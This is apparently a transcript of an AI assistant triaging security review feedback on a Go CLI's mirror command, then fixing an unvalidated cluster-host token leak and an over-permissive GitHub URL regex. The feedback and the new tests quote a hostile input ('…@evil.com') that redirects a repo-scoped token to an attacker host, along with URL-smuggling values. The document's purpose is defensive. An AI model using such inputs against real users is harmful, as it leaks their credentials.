content.text:
I got this review feedback:


1. Unvalidated cluster host is an SSRF / token-leak primitive (MEDIUM)

  cmd/entire/cli/repo_mirror.go:39-44 accepts clusterHost as the optional second positional arg and cmd/entire/cli/repo_mirror_probe.go:54
  concatenates it raw into a URL:

  checkURL := fmt.Sprintf("https://%s%s/info/refs?service=git-upload-pack", clusterHost, repoSlug)

  Same value also lands in the STS audience claim (auth/repo_token.go:101). Both go through fmt.Sprintf / string concat — no URL parsing, no
  allowlist, no scheme/userinfo check.

  Concrete attack: a user is socially-engineered into running entire repo mirror create owner/repo aws-us-east-2.entire.io@evil.com. Go's
  http.NewRequestWithContext parses that as host=evil.com, userinfo=aws-us-east-2.entire.io. The CLI then ships a Basic entire-cli:<repo-scoped-token>
   header to evil.com (repo_mirror_probe.go:128). The server-side invalid_target check on the STS exchange is the only gate — and depending on whether
   the core does URL-parsing or string-matching on audience, the gate may or may not catch the trick.

  Fix: validate cluster host with net.ParseIP + DNS-name regex, reject anything containing @, ?, #, /, or scheme prefixes. Cheap, defense-in-depth,
  doesn't rely on server canonicalization.



  2. parseGitHubURL regex is too permissive for the audience-binding role it plays (MEDIUM)
  cmd/entire/cli/repo_mirror_probe.go:28-30:

  gitHubBareRe = regexp.MustCompile(`^(?:github\.com/)?([^/\s]+)/([^/\s]+?)(?:\.git)?$`)

  [^/\s]+ allows ?, #, ;, .., %, control characters (above 0x20), and more. The captured owner/repo flow into the audience string
  https://<clusterHost>/gh/<owner>/<repo> and the probe URL. A repo named owner?bypass=1 mutates the URL's query string; owner#anchor truncates the
  path; owner%2f may or may not be decoded depending on the layer.

  Concrete attack: a user is socially-engineered into running entire repo mirror create owner/repo aws-us-east-2.entire.io@evil.com. Go's http.NewRequestWithContext parses that as host=evil.com, userinfo=aws-us-east-2.entire.io. The CLI then ships a Basic entire-cli:<repo-scoped-token> header to evil.com (repo_mirror_probe.go:128). The server-side invalid_target check on the
  STS exchange is the only gate — and depending on whether the core does URL-parsing or string-matching on audience, the gate may or may not catch the trick.

  Fix: validate cluster host with net.ParseIP + DNS-name regex, reject anything containing @, ?, #, /, or scheme prefixes. Cheap, defense-in-depth, doesn't rely on server canonicalization.

  3. parseGitHubURL regex is too permissive for the audience-binding role it plays (MEDIUM)
  cmd/entire/cli/repo_mirror_probe.go:28-30:
  gitHubBareRe = regexp.MustCompile(`^(?:github\.com/)?([^/\s]+)/([^/\s]+?)(?:\.git)?$`)
  [^/\s]+ allows ?, #, ;, .., %, control characters (above 0x20), and more. The captured owner/repo flow into the audience string https://<clusterHost>/gh/<owner>/<repo> and the probe URL. A repo named owner?bypass=1 mutates the URL's query string; owner#anchor truncates the path; owner%2f may or may not be decoded depending on the layer.
  GitHub's actual allowed character set is [A-Za-z0-9._-] for owners and [A-Za-z0-9._-] for repos. Tightening the regex to match upstream reality closes parameter-smuggling vectors at the boundary instead of relying on whatever the server does with weird strings.

Can you take a look and give me an overview
I'll look at the files referenced in the review to give you an accurate overview.

16	)

18	// gitHubHTTPSRe / gitHubSSHRe / gitHubBareRe parse the GitHub URL shapes
19	// `mirror create`/`remove` accept, mirroring the standalone entiredb CLI:
20	//
21	//	https://github.com/<owner>/<repo>(.git)
22	//	git@github.com:<owner>/<repo>(.git)
23	//	(github.com/)<owner>/<repo>
24	//
25	// owner/repo are lowercased so the synthesised /gh/<owner>/<repo> slug
26	// matches what the server persists.
27	var (
28		gitHubHTTPSRe = regexp.MustCompile(`^https?://github\.com/([^/]+)/([^/]+?)(?:\.git)?$`)
29		gitHubSSHRe   = regexp.MustCompile(`^git@github\.com:([^/]+)/([^/]+?)(?:\.git)?$`)
30		gitHubBareRe  = regexp.MustCompile(`^(?:github\.com/)?([^/\s]+)/([^/\s]+?)(?:\.git)?$`)
31	)
32	
33	func parseGitHubURL(rawURL string) (owner, repo string, err error) {
34		for _, re := range []*regexp.Regexp{gitHubHTTPSRe, gitHubSSHRe, gitHubBareRe} {
35			if m := re.FindStringSubmatch(rawURL); m != nil {
36				return strings.ToLower(m[1]), strings.ToLower(m[2]), nil
37			}
38		}
39		return "", "", fmt.Errorf("not a recognized GitHub URL: %s", rawURL)
40	}
41	
42	// waitForMirrorClone blocks until the mirror at /gh/<owner>/<repo> on
43	// clusterHost advertises a resolvable HEAD (the initial GitHub→EntireDB
44	// clone has landed) or the deadline expires. It probes the data plane's
45	// smart-HTTP info/refs endpoint every 2s, printing a heartbeat so a long
46	// clone doesn't look hung.
47	//
48	// Repo-scoped pull tokens are short-lived (minutes) while the default wait
49	// is 30m, so a single token can't cover the whole wait. The loop re-mints
50	// from the (long-lived) login token whenever a probe comes back 401,
51	// rather than minting once up front.
52	func waitForMirrorClone(ctx context.Context, out io.Writer, clusterHost, owner, repo string, timeout time.Duration) error {
53		repoSlug := "/gh/" + owner + "/" + repo
54		checkURL := fmt.Sprintf("https://%s%s/info/refs?service=git-upload-pack", clusterHost, repoSlug)
55	
56		mintToken := func() (string, error) {
57			return auth.RepoScopedToken(ctx, "https://"+clusterHost, repoSlug, "pull")
58		}
59		token, err := mintToken()
60		if err != nil {
61			return fmt.Errorf("authorize clone probe: %w", err)
62		}
63	
64		if timeout > 0 {
65			var cancel context.CancelFunc
66			ctx, cancel = context.WithTimeout(ctx, timeout)
67			defer cancel()
68		}
69	
70		ticker := time.NewTicker(2 * time.Second)
71		defer ticker.Stop()
72	
73		cloning := false
74		for {
75			ready, status := mirrorAdvertisesHead(ctx, checkURL, token)
76			switch {
77			case ready:
78				if cloning {
79					fmt.Fprintln(out, " ready")
80				} else {
81					fmt.Fprintln(out, "  ready to use")
82				}
83				return nil
84			case status == http.StatusUnauthorized:
85				// The repo-scoped token expired mid-wait; mint a fresh one from
86				// the login token and re-probe after the usual interval (no dot,
87				// since this is a token refresh, not clone progress).
88				if token, err = mintToken(); err != nil {
89					if cloning {
90						fmt.Fprintln(out)
91					}
92					return fmt.Errorf("re-authorize clone probe: %w", err)
93				}
94			default:
95				if !cloning {
96					fmt.Fprint(out, "  cloning")
97					cloning = true
98				}
99				fmt.Fprint(out, ".")
100			}
101			select {
102			case <-ctx.Done():
103				fmt.Fprintln(out)
104				// User cancellation (Ctrl+C) should exit quietly, not print a
105				// "timed out…: context canceled" line. NewSilentError signals
106				// main.go to skip printing; a real deadline still reports.
107				if errors.Is(ctx.Err(), context.Canceled) {
108					return NewSilentError(ctx.Err())
109				}
110				return fmt.Errorf("timed out waiting for initial clone: %w", ctx.Err())
111			case <-ticker.C:
112			}
113		}
114	}
115	
116	// mirrorAdvertisesHead fetches the smart-HTTP ref advertisement and reports
117	// whether HEAD resolves to a real commit, plus the HTTP status so the
118	// caller can distinguish an expired token (401, re-mint) from a
119	// still-cloning mirror (200 with no resolvable HEAD, or 404/503). status is
120	// 0 for transport/build/decode failures, treated as "not ready, keep
121	// waiting". Auth is the repo-scoped token as HTTP basic-auth password, the
122	// same shape git presents over the entire:// transport.
123	func mirrorAdvertisesHead(ctx context.Context, checkURL, token string) (ready bool, status int) {
124		req, err := http.NewRequestWithContext(ctx, http.MethodGet, checkURL, nil)
125		if err != nil {
126			return false, 0
127		}
128		req.SetBasicAuth("entire-cli", token)
129		resp, err := http.DefaultClient.Do(req)
130		if err != nil {
131			return false, 0
132		}
133		defer func() { _ = resp.Body.Close() }()
134		if resp.StatusCode != http.StatusOK {
135			return false, resp.StatusCode
136		}
137		// Smart-HTTP wraps the advertisement in a "# service=..." pkt-line
138		// header + flush; AdvRefs.Decode expects to start at the first ref
139		// line, so strip the wrapper first.
140		var sr packp.SmartReply
141		if err := sr.Decode(resp.Body); err != nil {
142			return false, 0
143		}
144		var adv packp.AdvRefs
145		if err := adv.Decode(resp.Body); err != nil {
146			return false, 0
147		}
148		if _, err := adv.ResolvedHead(); err != nil {
149			return false, http.StatusOK // reachable, clone still in progress
150		}
151		return true, http.StatusOK
152	}

29	// RepoScopedToken exchanges the logged-in user's token for a short-lived,
30	// repo-scoped access token usable against a data-plane cluster's git
31	// endpoints (clone / fetch / info-refs).
32	//
33	// The data plane's git gate rejects the raw login bearer (HTTP 403): it
34	// only accepts a token whose RFC 8693 audience is <clusterBaseURL><repoSlug>
35	// and whose scope is "repo:<action>". This is the same exchange
36	// git-remote-entire performs internally for the entire:// transport — the
37	// CLI does it in-process when it needs to read the data plane directly
38	// (e.g. probing a mirror's clone readiness).
39	//
40	//   - clusterBaseURL is the data-plane cluster origin (scheme+host, e.g.
41	//     https://aws-us-east-2.entire.io); a trailing slash is trimmed.
42	//   - repoSlug is the full surface-prefixed path (e.g. /gh/octocat/hello
43	//     or /et/<project>/<repo>), joined to the cluster URL verbatim to form
44	//     the audience.
45	//   - action is "pull" for reads or "push" for writes.
46	//
47	// The exchange targets the same core endpoint and client identity the CLI
48	// logged in against (AuthBaseURL + the provider's STS path, client_id
49	// entire-cli), so a successful login implies a usable exchange. Errors
50	// surface verbatim from the STS endpoint (e.g. invalid_target when no
51	// mirror matches the slug+cluster).
52	//
53	// The subject token is the stored login access token read directly,
54	// rather than routed through the refresh-aware tokenmanager. That's
55	// deliberate for two reasons: (1) `entire login` (device flow) stores only
56	// a bare access token — no refresh token — so there is nothing the manager
57	// could refresh that this path can't equally use; an expired login token
58	// fails both ways. (2) The manager's exchange also emits an RFC 8693
59	// `resource` parameter alongside `audience`, whereas the data-plane gate
60	// keys solely on `audience`; going direct keeps the wire form byte-for-byte
61	// what git-remote-entire (and the standalone entiredb CLI) already send.
62	// Each call performs a fresh exchange and does not cache — callers that
63	// poll (e.g. the mirror clone wait) re-invoke on token expiry. If the CLI
64	// gains refresh tokens, route this through the tokenmanager instead.
65	func RepoScopedToken(ctx context.Context, clusterBaseURL, repoSlug, action string) (string, error) {
66		provider := CurrentProvider()
67		if strings.TrimSpace(provider.STSPath) == "" {
68			return "", errors.New("repo-scoped token exchange requires a v2 auth host (set ENTIRE_AUTH_BASE_URL to a core that exposes /oauth/token)")
69		}
70	
71		loginJWT, err := LookupCurrentToken()
72		if err != nil {
73			return "", fmt.Errorf("read login token: %w", err)
74		}
75		if loginJWT == "" {
76			return "", ErrNotLoggedIn
77		}
78	
79		clusterBaseURL = strings.TrimRight(clusterBaseURL, "/")
80		if clusterBaseURL == "" {
81			return "", errors.New("repo-scoped token exchange requires a target cluster URL")
82		}
83		issuer := api.AuthBaseURL()
84	
85		client := &sts.Client{
86			Transport:         repoExchangeTransportForTest,
87			BaseURL:           issuer,
88			Path:              provider.STSPath,
89			UserAgent:         provider.ClientID,
90			AllowInsecureHTTP: isLoopbackHTTP(issuer) || insecureHTTPOverride.Load(),
91		}
92		set, err := client.Exchange(ctx, sts.ExchangeRequest{
93			SubjectToken:     loginJWT,
94			SubjectTokenType: sts.SubjectTokenTypeAccessToken,
95			// sts.Client (unlike the tokenmanager) applies no default, so set
96			// requested_token_type explicitly to the access-token URI.
97			RequestedTokenType: sts.SubjectTokenTypeAccessToken,
98			// Audience-only (no Resource): the data plane's git gate keys its
99			// repo check on the audience host+slug. Sending a separate resource
100			// param risks the server validating a different value than it grants.
101			Audience: clusterBaseURL + repoSlug,
102			Scope:    "repo:" + action,
103			// Public-client identification per RFC 6749 §2.3.1, carried via
104			// Extra because the sts package is provider-agnostic.
105			Extra: url.Values{"client_id": {provider.ClientID}},
106		})
107		if err != nil {
108			return "", fmt.Errorf("repo-scoped token exchange: %w", err)
109		}
110		return set.AccessToken, nil
111	}

content.text:
Looked at all three files. Here's my read.

## First, the feedback itself is garbled

You got **three numbered items but only two distinct issues** — there's copy-paste damage:

- **#1** = unvalidated `clusterHost` (SSRF / token-leak). Correct body.
- **#2** = *titled* "parseGitHubURL regex too permissive" but its **body is a verbatim paste of #1** (talks about `clusterHost` and the `@evil.com` attack, not the regex). Broken.
- **#3** = "parseGitHubURL regex too permissive" with the *correct* regex body.

So treat it as **two real findings**: (A) unvalidated cluster host, (B) over-permissive owner/repo regex.

## Issue A — unvalidated `clusterHost` (legit, MEDIUM-ish)

`clusterArg` (`repo_mirror.go:39-44`) returns `args[1]` raw. It flows into two places with no parsing:

- `repo_mirror_probe.go:54` → `fmt.Sprintf("https://%s%s/info/refs?...", clusterHost, repoSlug)` then `http.NewRequestWithContext` (line 124) + `SetBasicAuth("entire-cli", token)` (line 128).
- `repo_token.go:101` → STS audience `clusterBaseURL + repoSlug` where `clusterBaseURL = "https://" + clusterHost`.

The `aws-us-east-2.entire.io@evil.com` attack is real in mechanism: Go parses that as `host=evil.com, userinfo=aws-…`, and `SetBasicAuth` then ships `Basic entire-cli:<repo-scoped-token>` to `evil.com`.

**Caveats that lower the real severity** (worth noting back to the reviewer, not dismissing):
- The probe only runs *after* a successful `CreateMirror` server call, and the token is **repo-scoped + short-lived (minutes)**.
- The STS `invalid_target` check is a genuine server gate — the token only leaks if the server grants it for the weird audience.
- It requires social engineering of the exact arg.

Still — client-side host validation is cheap, correct defense-in-depth, and the right place to stop it. I agree with the fix.

## Issue B — `gitHubBareRe` too permissive (legit, lower)

`repo_mirror_probe.go:30`: `([^/\s]+)/([^/\s]+?)` admits `?`, `#`, `%`, `..`, control chars. owner/repo land in both the audience string and the probe URL path, so `repo?bypass=1` / `repo#x` can mutate query/fragment.

Same caveat: `CreateMirror` runs first and the server validates owner/repo, so the malformed value usually never reaches the probe. But the audience is built from it too, and tightening to GitHub's real charset at the boundary is correct. Minor accuracy note: GitHub **owners** are `[A-Za-z0-9-]` (no dots/underscores); **repos** are `[A-Za-z0-9._-]`. The reviewer's `[A-Za-z0-9._-]` for both is slightly loose on owner but acceptable.

Also note all three regexes share this: `gitHubHTTPSRe`/`gitHubSSHRe` use `[^/]+` (no `\s` exclusion even), so any tightening should cover all three consistently, and the comment says these were **ported verbatim from entiredb** — worth checking whether entiredb wants the same fix so they don't drift.

## My recommendation

Both worth fixing; neither is a "drop everything" — they're defense-in-depth behind real server gates. Concretely:

1. A small `validateClusterHost(string) error` (DNS-name regex + `net.ParseIP`, reject anything with `@ ? # / :` or a scheme prefix), called in `clusterArg`/the two `RunE`s.
2. Tighten the three GitHub regexes to GitHub's real charset, with table-test cases for the smuggling inputs (`owner?bypass=1`, `owner#x`, `a@b`, `..`).

Want me to implement both, or just one? And should I check the upstream `entiredb` copy of `parseGitHubURL` so the regex fix doesn't drift between the two?
yeah fix 1+2, then check entiredb

Done. Here's the summary.

## What I changed (CLI — `devenv/cli`)

**Fix 1 — unvalidated cluster host** (`repo_mirror.go`)
- Added `validateClusterHost()`: parses `"https://"+host` the same way the downstream code does and requires it to round-trip to a bare `host[:port]` — **rejects** userinfo (`@`), path, query, fragment, scheme prefix — then confirms the hostname is a valid IP (`net.ParseIP`) or DNS name (per-label regex). Allows ports and `localhost`/IPs for dev.
- Wired it into both `create` and `remove` `RunE`, right after `clusterArg`, returning `invalid [cluster-host]: …` with `SilenceUsage`.
- The `aws-us-east-2.entire.io@evil.com` token-leak primitive is now rejected client-side, independent of the server's STS `invalid_target` check.

**Fix 2 — over-permissive GitHub regex** (`repo_mirror_probe.go`)
- Tightened all three regexes to GitHub's real charset via shared consts: owner `[A-Za-z0-9-]+`, repo `[A-Za-z0-9._-]+?`. Closes `repo?bypass=1`, `repo#x`, `%2f`, `..`, control chars before they reach the STS audience / probe URL.

**Tests** — added smuggling cases to `TestParseGitHubURL` (query, fragment, `@`, `%2f`, `..`, underscore-owner) plus legit `hello.world`/`hello_world`, and a new `TestValidateClusterHost` table (userinfo/path/query/fragment/scheme/space/leading-hyphen rejected; default/region/localhost/port/IP accepted).

`mise run fmt && mise run lint` clean; targeted tests pass.

## entiredb check — **same two vulns exist upstream, unfixed**

`devenv/entiredb/cmd/entire-repo/cli/mirror.go` is where the CLI's `parseGitHubURL` was ported from verbatim, and it has both issues identically:
- Lines 661/664/671: the same loose `[^/]+` / `[^/\s]+` regexes.
- Same raw `"https://" + clusterHost` concat into `checkURL` (line 229), `BaseURL` (196/287/566), and the STS audience (line 700).

One mitigating difference: entiredb routes clusterHost through `ResolveClusterContext` → `ResolveContextForCluster`, a local-config **lookup** keyed on the host. A bogus host like `…@evil.com` won't match a known context and likely errors before any token is sent — so it's *incidentally* harder to exploit there, but there's no deliberate host validation and the raw concat is still present. The regex issue has no such mitigation.

I did **not** touch entiredb (separate repo, and you only asked me to check it). Want me to port both fixes there too? It's a near-mechanical copy of the same diff plus the test cases.
